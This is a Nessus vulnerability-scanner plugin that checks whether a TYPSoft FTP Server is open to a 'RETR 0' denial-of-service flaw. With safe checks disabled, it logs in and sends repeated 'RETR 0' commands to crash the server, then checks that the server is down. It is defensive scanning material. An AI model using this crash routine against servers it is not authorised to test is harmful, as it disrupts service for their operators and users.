#
# (C) Tenable Network Security
#


 desc = "
Synopsis :

The remote FTP server is affected by a denial of service flaw. 

Description :

The remote host appears to be using TYPSoft FTP Server, a small FTP
server for Windows. 

The version of TYPSoft FTP Server installed on the remote host suffers
from a denial of service vulnerability.  By sending multiple 'RETR 0'
commands, an authenticated attacker can crash the server. 

See also : 

http://www.exploitlabs.com/files/advisories/EXPL-A-2005-016-typsoft-ftpd.txt

Solution : 

Grant access only to trusted users.

Risk factor : 

Low / CVSS Base Score : 2 
(AV:R/AC:L/Au:R/C:N/A:P/I:N/B:A)";


if (description) {
  script_id(20012);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3294");
  script_bugtraq_id(15104);
 
  script_name(english:"TYPSoft FTP Server RETR 0 Denial of Service Vulnerability");
  script_summary(english:"Checks for RETR 0 denial of service vulnerability in TYPSoft FTP Server");
 
  script_description(english:desc);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Denial of Service");
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include("global_settings.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port) ) exit(0);


# If it looks like TYPSoft FTP...
banner = get_ftp_banner(port:port);
if (
  banner && 
  egrep(pattern:"220[ -]TYPSoft FTP", string:banner)
) {
  # If safe checks are enabled...
  if (safe_checks()) {
    # There's a problem if the banner reports it's 1.10 or older.
    if (egrep(pattern:"^220[ -]TYPSoft FTP Server 1\.(0.*|10) ", string:banner)) {
      report = str_replace(
        string:desc,
        find:"See also :",
        replace:string(
          "***** Nessus has determined the vulnerability exists on the remote\n",
          "***** host simply by looking at the version number of TYPSoft FTP\n",
          "***** Server installed there.\n",
          "\n",
          "See also :"
        )
      );
      security_note(port:port, data:report);
      exit(0);
    }
  }
  # Otherwise...
  else {
    soc = open_sock_tcp(port);
    if (soc) {
      user = get_kb_item("ftp/login");
      pass = get_kb_item("ftp/password");
      if (!user || !pass) {
        if (log_verbosity > 1) debug_print("ftp/login and/or ftp/password are empty!", level:0);
        exit(0);
      }

      if (!ftp_authenticate(socket:soc, user:user, pass:pass)) {
        if (log_verbosity > 1) debug_print("can't login with supplied ftp credentials!", level:0);
        close(soc);
        exit(1);
      }

      # Supposedly, it crashes after just two iterations.
      for (iter = 0; iter < 5; iter++) {
        c = string("RETR 0");
        send(socket:soc, data:string(c, "\r\n"));

        # Wait a bit to give the server a chance to crash.
        if (iter > 1) sleep(1);

        s = ftp_recv_line(socket:soc);
        if (isnull(s)) break;
      }

      # If we didn't get a response after sending at least one exploit...
      if (isnull(s) && iter > 1) {
        # Check whether it's truly down.
        soc2 = open_sock_tcp(port);

        if (soc2) close(soc2);
        else {
          security_note(port);
          exit(0);
        }
      }

      close(soc);
    }
  }
}
